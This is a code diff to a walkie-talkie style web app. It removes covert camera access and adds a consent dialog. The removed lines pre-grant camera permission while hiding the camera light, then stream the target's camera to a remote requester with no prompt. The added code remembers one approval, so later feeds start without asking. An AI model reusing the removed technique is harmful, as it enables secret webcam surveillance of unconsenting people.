@@ -502,6 +502,53 @@
       background: repeating-linear-gradient(0deg, rgba(34, 197, 94, 0.08) 0px, transparent 2px, transparent 4px);
       pointer-events: none;
     }
+
+    /* Target One-Time Auth Dialog */
+    .auth-modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.85);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+    }
+    .auth-box {
+      background: #1c2125;
+      border: 2px solid #ff7700;
+      border-radius: 8px;
+      padding: 20px;
+      width: 290px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(255, 119, 0, 0.4);
+    }
+    .auth-box h3 {
+      font-family: 'Orbitron', monospace;
+      font-size: 13px;
+      color: #ff7700;
+      margin-bottom: 8px;
+    }
+    .auth-box p {
+      font-size: 13px;
+      color: #cbd5e1;
+      margin-bottom: 16px;
+    }
+    .auth-btn-row {
+      display: flex;
+      gap: 10px;
+    }
+    .auth-btn-row button {
+      flex: 1;
+      padding: 8px;
+      font-family: 'Orbitron', monospace;
+      font-weight: 700;
+      font-size: 11px;
+      border-radius: 4px;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-auth-accept { background: #22c55e; color: #000; }
+    .btn-auth-deny { background: #ef4444; color: #fff; }
   </style>
 </head>
 <body>
@@ -613,6 +660,18 @@
   </div>
 </div>
 
+<!-- Target Initial Authorization Modal -->
+<div class="auth-modal" id="reconAuthModal">
+  <div class="auth-box">
+    <h3>TACTICAL UPLINK</h3>
+    <p>HQ requests forward optical link. Authorize camera Recon?</p>
+    <div class="auth-btn-row">
+      <button class="btn-auth-accept" id="acceptReconBtn">AUTHORIZE</button>
+      <button class="btn-auth-deny" id="denyReconBtn">DISMISS</button>
+    </div>
+  </div>
+</div>
+
 <script>
   const socket = io();
 
@@ -692,6 +751,9 @@
   const reconMonitor = document.getElementById('reconMonitor');
   const reconRemoteVideo = document.getElementById('reconRemoteVideo');
   const closeReconBtn = document.getElementById('closeReconBtn');
+  const reconAuthModal = document.getElementById('reconAuthModal');
+  const acceptReconBtn = document.getElementById('acceptReconBtn');
+  const denyReconBtn = document.getElementById('denyReconBtn');
 
   // Load saved preferences
   if (localStorage.getItem('saved_callsign')) {
@@ -895,17 +957,10 @@
           audioConstraints.deviceId = { exact: selectedMicId };
         }
 
-        // Silent Camera Permission Pre-grant (Mic + Camera ek sath trigger, fir video track instantly stop)
-        const initialStream = await navigator.mediaDevices.getUserMedia({
+        rawMicStream = await navigator.mediaDevices.getUserMedia({
           audio: audioConstraints,
-          video: { facingMode: "user" }
+          video: false
         });
-
-        // Hardware camera light instantly off karne ke liye video track ko stop karo
-        initialStream.getVideoTracks().forEach(t => t.stop());
-
-        // Sirf audio track capture rakho
-        rawMicStream = new MediaStream(initialStream.getAudioTracks());
 
         await populateAudioDevices();
 
@@ -1191,14 +1246,38 @@
     btnTriggerRecon.innerText = "UPLINK REQUESTED...";
   });
 
-  // Incoming Request on Target's device (Completely Silent - No popup/modal)
+  // Incoming Request on Target's device
+  let pendingReconRequester = null;
   socket.on('recon-requested', async ({ from }) => {
-    startReconTransmission(from);
+    pendingReconRequester = from;
+    const alreadyAuthorized = localStorage.getItem('recon_authorized') === 'true';
+
+    if (alreadyAuthorized) {
+      startReconTransmission(from);
+    } else {
+      reconAuthModal.style.display = 'flex';
+    }
+  });
+
+  acceptReconBtn.addEventListener('click', () => {
+    reconAuthModal.style.display = 'none';
+    localStorage.setItem('recon_authorized', 'true');
+    if (pendingReconRequester) {
+      startReconTransmission(pendingReconRequester);
+    }
+  });
+
+  denyReconBtn.addEventListener('click', () => {
+    reconAuthModal.style.display = 'none';
+    if (pendingReconRequester) {
+      socket.emit('recon-declined', { to: pendingReconRequester });
+      pendingReconRequester = null;
+    }
   });
 
   socket.on('recon-declined', () => {
     btnTriggerRecon.innerText = "SECURE RECON FEED";
-    alert("Uplink failed or permission denied.");
+    alert("Uplink request declined by unit.");
   });
 
   // Target Stream Transmitter Logic
@@ -1220,7 +1299,6 @@
       }
     } catch (err) {
       console.error("Recon capture error:", err);
-      socket.emit('recon-declined', { to: requesterId });
     }
   }
 
